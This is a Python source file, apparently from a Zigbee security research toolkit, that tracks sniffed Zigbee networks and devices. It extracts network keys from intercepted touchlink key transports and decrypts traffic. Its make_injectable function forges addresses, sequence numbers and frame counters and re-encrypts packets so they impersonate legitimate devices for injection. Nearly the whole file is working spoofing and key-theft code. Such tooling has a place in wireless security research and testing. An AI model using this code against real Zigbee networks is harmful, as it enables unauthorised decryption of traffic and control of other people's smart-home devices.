#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Track Zigbee devices and networks by passing sniffed packeges. Device addresses
and sequence numbers are extracted and are used to modify arbitrary command
packets in a way to spoof devices.
"""

import argparse
import struct
import sys
import time

from killerbee import *
from killerbee.scapy_extensions import *
from scapy.all import *
from scapy.layers.dot15d4 import *

from z3sec import touchlink_crypt

class ZBNetwork():
    """A Zigbee network representation.

    Contains network addresses, the network key (if known) and a list of member
    devices. A ZBNetwork object ist automatically generated and filled when a
    packet of an unknown network is passed via the handle_packets() function.
    However, you can create a ZBNetwork object manually in advance when the
    network key for the network is known in advance and it is unlikely that a
    touchlink keytransport will happen in the future.

    Parameters
    ----------
    pan_id : int
        Short PAN identifier of the network.
    ext_pan_id : int
        Long/IEEE PAN identifier of the network.
    network_key : byte string
        The current network key of the network.

    Attributes
    ----------
    pan_id : int
        Short PAN identifier of the network (2 octets).
    ext_pan_id : int
        Long/IEEE PAN identifier of the network (8 octets).
    network_key : byte string
        The current network key of the network (16 octets)
    devices : list of ZBDevice
        Devices that are associated to the network (member devices).
    """
    def __init__(self, pan_id=None, ext_pan_id=None, network_key=None):
        self.pan_id = pan_id
        self.ext_pan_id = ext_pan_id
        self.network_key = network_key
        self.devices = []

    def show(self):
        """Print the properties of the network in form of a table."""
        print("pan_id:      {}".format(_addr_repr(self.pan_id)))
        print("pan_id_ext:  {}".format(_addr_repr(self.ext_pan_id, ext=True)))
        if self.network_key is not None:
            print("network_key: {}".format(self.network_key.encode('hex')))
        else:
            print("network_key: {}".format(self.network_key))
        print("# Devices:   {}".format(len(self.devices)))
        header = ["#", "addr", "addr_ext", "mac_sqn", "nwk_sqn", "sec_fc", "aps_fc",
                "zcl_sqn", "zdp_sqn"]
        data = []
        for n, dev in enumerate(self.devices):
            data.append([
                n,
                _addr_repr(dev.addr),
                _addr_repr(dev.ext_addr, ext=True),
                dev.mac_sqn,
                dev.nwk_sqn,
                dev.sec_fc,
                dev.aps_fc,
                dev.zcl_sqn,
                dev.zdp_sqn
            ])
        _print_table(header, data)

    def get_device(self, addr, ext=False):
        """Return a member device of the network, or associate a new
        address/device to the network.

        Search and for member devices of the network. If addr is a short
        address and it is not associated to the network yet (not found during
        search), a new device object is created and returned. This new device
        is then already associated to the network.

        Parameters
        ----------
        addr : int
            Either the short or the extended/IEEE address of the device,
            depending on the passed flag `ext`.
        ext : bool
            Specifies if the passed `addr` is assumed to be a short (false) or
            extended/IEEE address (true).

        Returns
        -------
        ZBDevice
            The member device of network (might be newly created) or, if an
            extended address is passed and this address is not asscoiated to
            the network None is returned.
        """
        # check if device is already member of this network
        for dev in self.devices:
            if ext is False:
                if dev.addr == addr:
                    return dev
            else:
                if dev.ext_addr == addr:
                    return dev
        # device is unknown -> creating new
        #   do not create device with ext_addr in order to avoid
        #   doublicate devices in network device list
        if ext is False:
            new_device = ZBDevice()
            new_device.addr = addr
            self.devices.append(new_device)
            return new_device
        return None

class ZBDevice():
    """A Zigbee device representation.

    Contains device addresses, various sequence numbers, the associated network
    and a list of devices to which this device sent packets (destinations).

    Attributes
    ----------
    addr : int
        Short address.
    ext_addr : int
        Extended/IEEE address.
    mac_sqn : int
        802.14.4 mac sequence number (1 octet).
    mac_sqn_offset : int
        Value to increase mac_sqn when spoofing packets.
    nwk_sqn : int
        Zigbee network layer sequence number (1 octet).
    nwk_sqn_offset : int
        Value to increase nwk_sqn when spoofing packets.
    sec_fc : int
        Zigbee security header framecounter (4 octets)
    sec_fc_offset
        Value to increase sec_fc when spoofing packets.
    aps_fc : int
        Zigbee AppData payload counter (1 octet)
    aps_fc_offset
        Value to increase aps_fc when spoofing packets.
    zcl_sqn : int
        Zigbee Cluster Library transaction sequence number (1 octet)
    zcl_sqn_offset : int
        Value to increase zcl_sqn when spoofing packets.
    zdp_sqn : int
        Zigbee Device Profile transaction sequence (1 octet)
    zdp_sqn_offset : int
        Value to increase zdp_sqn when spoofing packets.
    network : ZBNetwork
        The network associated with this device.
    destinations : list of ZBDevice
        The devices to which this device sent packets in the past.
    """
    def __init__(self):
        self.addr = None
        self.ext_addr = None
        # maybe macDSN / macBSN for beacons injection
        self.mac_sqn = None  # Dot15d4.seqnum (1 octet)
        self.mac_sqn_offset = 1
        # self.sec_fc = None  # Dot15d4AuxSecurityHeader.sec_framecounter // no
        # zb_nwk_seqnumber
        self.nwk_sqn = None  # ZigbeeNWK.seqnum (1 octet)
        self.nwk_sqn_offset = 1
        # frame_counter
        self.sec_fc = None  # ZigbeeSecurityHeader.fc (4 octets)
        self.sec_fc_offset = 1
        # zb_zadp_counter
        self.aps_fc = None  # ZigbeeAppDataPayload.counter (1 octet)
        self.aps_fc_offset = 1
        self.zcl_sqn = None  # ZigbeeClusterLibrary.transaction_sequence (1 octet)
        self.zcl_sqn_offset = 1
        self.zdp_sqn = None  # ZigbeeDeviceProfile.transaction_sequence (1 octet)
        self.zdp_sqn_offset = 1
        self.network = None
        self.destinations = []

    def show(self):
        """Print the properties of the device in form of a table."""
        print("> Short Address: {}".format(_addr_repr(self.addr)))
        print("ext addr: {}".format(_addr_repr(self.ext_addr)))
        print("mac sqn:  {}".format(self.mac_sqn))
        print("nwk sqn:  {}".format(self.nwk_sqn))
        print("sec fc:   {}".format(self.sec_fc))
        print("aps fc:   {}".format(self.aps_fc))
        print("zcl sqn:  {}".format(self.zcl_sqn))
        print("zdp sqn:  {}".format(self.zdp_sqn))

    def get_destination(self, addr, ext=False):
        """Get the device object, which is a destination of the device.

        If the address was not previously associated as a destination, then it
        is set as a destination.

        Attributes
        ----------
        addr : int
            The address of the destination device.
        ext : bool
            Specifies if the `addr` attribute is a short or extended address.

        Returns
        -------
        ZBDevice
        """
        # check if dev is already registered as destination
        for dev in self.destinations:
            if ext is False:
                if dev.addr == addr:
                    return dev
            else:
                if dev.ext_addr == addr:
                    return dev
        # get device from network and add to own destinations
        dev = self.network.get_device(addr, ext=ext)
        if dev is not None:
            self.destinations.append(dev)
        return dev

    def update_mac_sqn(self, pkt):
        """Updates the MAC properties with those found in the packet.

        Extracts the MAC seqnum and sec_fc from the packet. Invoke this
        function only the device which is the MAC source device of the
        packet.

        Attributes
        ----------
        pkt : scapy_pkt
            The packet from which the properties are extracted.
        """
        # If ACK -> no update
        if Dot15d4Ack in pkt:
            return
        # update SQNs:
        if Dot15d4 in pkt:
            self.mac_sqn = pkt[Dot15d4].seqnum
        if Dot15d4FCS in pkt:
            self.mac_sqn = pkt[Dot15d4FCS].seqnum
        if ZigbeeSecurityHeader in pkt:
            self.sec_fc = pkt[ZigbeeSecurityHeader].fc

    def update_nwk_sqn(self, pkt):
        """Extracts the ZigBee seqnums / counters / framecounters. Invoke this
        function only on the NWK source device."""
        # If ACK -> no update
        if ZigbeeAppDataPayload in pkt \
            and pkt[ZigbeeAppDataPayload].aps_frametype == 2:
                return
        # update SQNs:
        if ZigbeeNWK in pkt:
            self.nwk_sqn = pkt[ZigbeeNWK].seqnum
        if ZigbeeAppDataPayload in pkt:
            self.aps_fc = pkt[ZigbeeAppDataPayload].counter
        if ZigbeeClusterLibrary in pkt \
                and pkt[ZigbeeClusterLibrary].direction == 0:  # client2server
            self.zcl_sqn = pkt[ZigbeeClusterLibrary].transaction_sequence
        # Extract ZDP counter (only from client2server commands):
        if is_zdp_client2server(pkt):
            self.zdp_sqn = pkt.transaction_sequence

class Observer():
    """Analyse packets and track all networks and devices.

    All packets that are submitted to this object are decrypted (if possible)
    and information of the lower network stack layers are examined.
    Thereby networks, devices, addresses and sequence numbers are extracted.
    A list of all observed Zigbee networks and Zigbee devices is generated.
    These information can be used to impersonate an observed device and spoof
    other devices in the same network.

    Notes
    -----
    Injecting might not work if the network key of a network is not passed
    during initialization or sniffed by observing a touchlink key transport.
    Upper network layer sequence numbers cannot be extracted.

    Attributes
    ----------
    networks : list of ZBNetwork
        A passed network should include a network key, if it is not likely that
        a touchlink key transport is sniffed later.

    """
    def __init__(self, networks=[]):
        self.known_networks = networks
        self.touchlink_scan_responses = []
    def extract_network(self, pkt):
        """Get the network in which the packet was sent.

        If the network is not yet known, a new ZBNetwork object is created and
        returned. The new network is added to the list of known networks.

        Attributes
        ----------
        pkt : scapy_pkt

        Returns
        -------
        ZBNetwork
        """
        # Data or Cmd frame:
        if pkt.haslayer(Dot15d4Data) or pkt.haslayer(Dot15d4Cmd):
            if (pkt.fcf_panidcompress == 0) \
                    and (pkt.fcf_srcaddrmode != 0):
                pan_id = pkt.src_panid
            else:
                pan_id = pkt.dest_panid
        # Beacon frame:
        elif pkt.haslayer(Dot15d4Beacon):
            pan_id = pkt.src_panid
        # No PAN ID found -> no network (should not happen):
        else:
            return None
        if pan_id == 0xffff:  # fake network
            return None

        # check if network is already known
        for network in self.known_networks:
            if network.pan_id == pan_id:
                return network
        # network not yet known -> add new network
        new_network = ZBNetwork()
        new_network.pan_id = pan_id
        self.known_networks.append(new_network)
        return new_network

    def extract_mac_src(self, pkt, network):
        """Get the MAC source device of the packet.

        MAC source device is the device which transmitted the packet most
        recently, even if the packet is relayed and originally sent by an other
        device.

        Attributes
        ----------
        pkt : scapy_pkt
        network : ZBNetwork
            The network to which the MAC source device belongs.

        Returns
        -------
        ZBDevice
        """
        fcf = None
        if Dot15d4 in pkt:
            fcf = pkt[Dot15d4]
        if Dot15d4FCS in pkt:
            fcf = pkt[Dot15d4FCS]
        if fcf is None:
            return None
        # extract source device
        source = None
        if Dot15d4Data in pkt:
            if fcf.fcf_srcaddrmode == 2:  # short
                source = network.get_device(pkt[Dot15d4Data].src_addr)
            if fcf.fcf_srcaddrmode == 3:  # long
                source = network.get_device(pkt[Dot15d4Data].src_addr, ext=True)
        # TODO: extract from Beacon / Cmd frame
        if source is None:
            return None
        # extract destination device
        if Dot15d4Data in pkt:
            if fcf.fcf_destaddrmode == 2:  # short
                dst_addr = pkt[Dot15d4Data].dest_addr
                if dst_addr in range(0xfff8, 0xffff + 1):  # Broadcast / Reserved
                    return source
                destination = source.get_destination(dst_addr)
            if fcf.fcf_destaddrmode == 3:  # long
                destination = source.get_destination(pkt[Dot15d4Data].dest_addr,
                        ext=True)
        return source


    def extract_nwk_src(self, pkt, network):
        """Get the network layer source device of a packet.

        Network layer source device is the device which initiated the
        transmission of a packet. The packet might be send by an other device,
        if the it is relayed.

        Attributes
        ----------
        pkt : scapy_pkt
        network : ZBNetwork
            The network to which the NWK source device belongs.

        Returns
        -------
        ZBDevice
        """
        if ZigbeeNWK in pkt:
            nwk = pkt[ZigbeeNWK]
            # Extract source addresses
            source = network.get_device(nwk.source)
            source.network = network
            if nwk.flags & 16:  # extended source address
                source.ext_addr = nwk.ext_src

            # Extract destination addresses
            dst_addr = nwk.destination
            if dst_addr in range(0xfff8, 0xffff + 1):  # Broadcast / Reserved
                return source
            destination = source.get_destination(nwk.destination)
            if nwk.flags & 8:  # extended destination address
                destination.ext_addr = nwk.ext_dst

            return source
        return None

    def _none_to_zero(self, value):
        if value is None:
            return 0
        else:
            return value

    def make_injectable(self, pkt, mac_src, nwk_src, mac_dst, nwk_dst):
        """Modify the given packet for injecting into a network.

        The packet is modifyed in such a way that is looks like it is
        originated by the specified devices. The addresses and current sequence
        numbers of the passed device objects are inserted into the packet at
        the appropriate places where it is designated in the packet. If the
        network key of the network is known, the packet is additionally
        encrypted. Other modification are not performed.

        Notes
        -----
        In order to impersonate an other device in the network, it is advised
        to send the modified packet immediately. Otherwise it can happen that
        the packet is rejected due to outdated sequence numbers.
        If the network key of the of the network is not known, the packet
        cannot be encrypted. An unencrypted packet will be rejected.

        Attributes
        ----------
        pkt : scapy_pkt
            The unencrypted packet to modify. All address fields and sequence
            numbers are overwritten, in order to fit values of the passed
            device objects.
        mac_src : ZBDevice
            The device which is set as the MAC layer source.
        nwk_src : ZBDevice
            The device which is set as the network layer source.
        mac_dst : ZBDevice
            The device which is set as the MAC layer destination.
        nwk_dst : ZBDevice
            The device which is set as the network layer destination.

        Returns
        -------
        scapy_pkt
            The modified packet; ready for injection.
        """
        # do not modify pkt, so the user can send/update it again later
        pkt = copy.deepcopy(pkt)

        # adjust SQNs:
        if Dot15d4 in pkt:
            pkt[Dot15d4].seqnum = \
                (self._none_to_zero(mac_src.mac_sqn) \
                + mac_src.mac_sqn_offset) % 2**8  # (1 octet)
        if Dot15d4FCS in pkt:
            pkt[Dot15d4FCS].seqnum = \
                (self._none_to_zero(mac_src.mac_sqn) \
                + mac_src.mac_sqn_offset) % 2**8  # (1 octet)
        if ZigbeeNWK in pkt:
            pkt[ZigbeeNWK].seqnum = \
                (self._none_to_zero(nwk_src.nwk_sqn) \
                + nwk_src.nwk_sqn_offset) % 2**8  # (1 octet)
        if ZigbeeSecurityHeader in pkt:
            pkt[ZigbeeSecurityHeader].fc = \
                (self._none_to_zero(mac_src.sec_fc) \
                + mac_src.sec_fc_offset) % 2**32  # (4 octets)
        if ZigbeeAppDataPayload in pkt:
            pkt[ZigbeeAppDataPayload].counter = \
                (self._none_to_zero(nwk_src.aps_fc) \
                + nwk_src.aps_fc_offset) % 2**8  # (1 octet)
        if ZigbeeClusterLibrary in pkt:
            if pkt[ZigbeeClusterLibrary].direction == 0:  # client2server
                pkt[ZigbeeClusterLibrary].transaction_sequence = \
                    (self._none_to_zero(nwk_src.zcl_sqn) \
                    + nwk_src.zcl_sqn_offset) % 2**8  # (1 octet)
            else:  # server2client
                pkt[ZigbeeClusterLibrary].transaction_sequence = \
                    (self._none_to_zero(nwk_dst.zcl_sqn) \
                    + nwk_dst.zcl_sqn_offset) % 2**8  # (1 octet)
        if is_zdp_client2server(pkt):
            pkt.transaction_sequence = \
                (self._none_to_zero(nwk_src.zdp_sqn) \
                + nwk_src.zdp_sqn_offset) % 2**8  # (1 octet)
        if is_zdp_server2client(pkt):
            pkt.transaction_sequence = \
                (self._none_to_zero(nwk_dst.zdp_sqn) \
                + nwk_dst.zdp_sqn_offset) % 2**8  # (1 octet)

        # TODO: adjust SQNs for other application profiles...?

        # set source and destination addresses in MAC layer:
        if (Dot15d4 in pkt or Dot15d4FCS in pkt) and Dot15d4Data in pkt:
            pkt.dest_panid = mac_dst.network.pan_id
            if pkt.fcf_srcaddrmode == 2:  # short
                pkt.src_addr = mac_src.addr
            elif pkt.fcf_srcaddrmode == 3:  # long
                pkt.src_addr = mac_src.ext_addr
            if pkt.fcf_destaddrmode == 2:  # short
                pkt.dest_addr = mac_dst.addr
            if pkt.fcf_destaddrmode == 3:  # long
                pkt.dest_addr = mac_dst.ext_addr
        # set source and destination addresses in NWK layer:
        if ZigbeeNWK in pkt:
            pkt[ZigbeeNWK].source = nwk_src.addr
            pkt[ZigbeeNWK].destination = nwk_dst.addr
            if pkt[ZigbeeNWK].flags & 16:
                pkt[ZigbeeNWK].ext_src = nwk_src.ext_addr
            if pkt[ZigbeeNWK].flags & 8:
                pkt[ZigbeeNWK].ext_dst = nwk_dst.ext_addr
        # set extended source in ZigbeeSecurityHeader:
        if ZigbeeSecurityHeader in pkt:
            if pkt[ZigbeeSecurityHeader].extended_nonce:
                pkt[ZigbeeSecurityHeader].source = nwk_src.ext_addr

        # update SQNs:
        mac_src.update_mac_sqn(pkt)
        nwk_src.update_nwk_sqn(pkt)

        # encrypt packet:
        if ZigbeeSecurityHeader in pkt:
            if pkt[ZigbeeSecurityHeader].key_type == 1:  # network key
                if nwk_src.network.network_key is not None:
                    pkt = self.encrypt(pkt, nwk_src.network.network_key)
                else:
                    print("WARNING: The network key of the source device is "
                            "not known. The packet could not be encrypted.")
        return pkt


    def decrypt(self, pkt, network_key):
        """Decrypt a packet with a network key.

        Attributes
        ----------
        pkt : scapy_pkt
        network_key : byte string

        Returns
        -------
        Decrypted packet.
        """
        payload = kbdecrypt(pkt, network_key, 0)
        pkt.data = ""  # remove encrypted payload
        pkt.mic = ""  # remove mic
        return pkt / payload

    def encrypt(self, pkt, network_key):
        """Encrypt a packet with a network key.

        Attributes
        ----------
        pkt : scapy_pkt
        network_key : byte string

        Returns
        -------
        Encrypted packet.
        """
        payload = pkt[ZigbeeSecurityHeader].payload  # deepcopy instead?
        pkt[ZigbeeSecurityHeader].remove_payload()
        return kbencrypt(pkt, payload, network_key, 0)

    def analyse(self, pkt):
        """Extract information from a packet.

        Extract the network, source devices, destination devices and sequence
        numbers and store the information internally. Even touchlink
        keystransports are analysed in order to obtain the network key of a
        network.

        Attributes
        ----------
        pkt ; scapy_pkt
            The packet to analyse.
        """
        pkt = copy.deepcopy(pkt)

        # Get network; add new ones, if we do not know it yet
        network = self.extract_network(pkt)
        if network is None:
            return pkt

        # extract network_key during touchlink commissioning
        if touchlink_crypt.is_scan_response(pkt):
            self.touchlink_scan_responses.append(pkt)
            return
        if touchlink_crypt.is_keytransport(pkt):
            response_id = touchlink_crypt.get_response_id(pkt,
                    self.touchlink_scan_responses)
            if response_id is None:
                return pkt
            network_key = touchlink_crypt.extract_network_key(pkt, response_id)
            network.network_key = network_key

        # TODO: extract network key from other key transport frames (if master
        # key known).

        # Decrypt packets, if we know the network key
        if network.network_key is not None \
                and pkt.haslayer(ZigbeeSecurityHeader) \
                and pkt.key_type == 1:
            pkt = self.decrypt(pkt, network.network_key)

        # get NWK source device and update SQNs:
        nwk_source = self.extract_nwk_src(pkt, network)
        if nwk_source is not None:
            nwk_source.update_nwk_sqn(pkt)

        # get MAC source device and update SQNs:
        mac_src = self.extract_mac_src(pkt, network)
        if mac_src is not None:
            mac_src.update_mac_sqn(pkt)

        return pkt


def is_zdp_client2server(pkt):
    """Check if the Zigbee device profile command inside the packet is to sent
    from a client to a server.

    Returns
    -------
    bool
    """
    if ZigbeeAppDataPayload in pkt and pkt[ZigbeeAppDataPayload].profile == 0:
        if pkt[ZigbeeAppDataPayload].cluster in \
                range(0x0000, 0x00ff):  # this might be wrong for future clusters
                # range(0x0000, 0x0006 +1) + range(0x0010, 0x001e +1) + \
                # range(0x0020, 0x002a +1) + range(0x0030, 0x0038 +1):
            return True
    return False

def is_zdp_server2client(pkt):
    """Check if the Zigbee device profile command inside the packet is to sent
    from a server to a client.

    Returns
    -------
    bool
    """
    if ZigbeeAppDataPayload in pkt and pkt[ZigbeeAppDataPayload].profile == 0:
        if pkt[ZigbeeAppDataPayload].cluster in \
                range(0x8000, 0x80ff):  # this might be wrong for future clusters
            return True
    return False

def _addr_repr(addr, ext=False):
    """Convert an address value (int) to a hex representation

    Parameters
    ----------
    addr : int
        The address as an integer.
    ext : bool
        Specifies if the passed `addr` is assumed to be a short (false) or
        extended/IEEE address (true).

    Returns
    -------
    string, None
        Human readable hex representation. For short addresses the hex
        representation is used and for extended addresses the bytes (hex) are
        outputted, seperated by ":". If addr is None, then None is returned.
    """
    if addr is None:
        return None
    if ext:
        addr_ext = struct.pack(">Q", addr)
        return ":".join(["{0:>02x}".format(ord(byte)) for byte in addr_ext])
    else:
        return hex(addr)

def _print_table(header, data):
    """Simple table printer.

    Parameters
    ----------
    header : list of str
        Column names.
    data : list of list of str
        Each inner list contains the values for one row.
    """
    # calculate width of columns
    widths = []
    for i, h in enumerate(header):
        max_len = len(str(h))
        for d in data:
            if len(str(d[i])) > max_len:
                max_len = len(str(d[i]))
        widths.append(max_len)
    # generate format string:
    row_format = ""
    for w in widths:
        row_format += "{:<" + str(w+1) + "}|"
    print(row_format.format(*header))
    print("=" * (sum(widths) + 2*len(header)))  # seperator
    for d in data:
        print(row_format.format(*d))
